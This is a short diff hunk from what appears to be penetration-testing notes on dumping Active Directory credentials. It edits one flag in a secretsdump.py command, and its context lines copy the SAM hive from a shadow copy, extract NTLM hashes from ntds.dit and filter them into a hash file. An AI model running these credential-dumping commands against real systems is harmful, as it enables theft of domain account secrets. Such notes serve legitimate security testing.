@@ -307,7 +307,7 @@ To find where NTDS is run the below:
 
 `copy \\? \GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM .`
 
-`secretsdump.py -system system.save -ntds ntds.dit LOCAL  -just-dc-ntlm`
+`secretsdump.py -system system.save -ntds ntds.dit local -just-dc-ntlm`
 
 `grep -a -F ':::' hashes.txt | grep -av '$:' > finalhashes.txt`
 
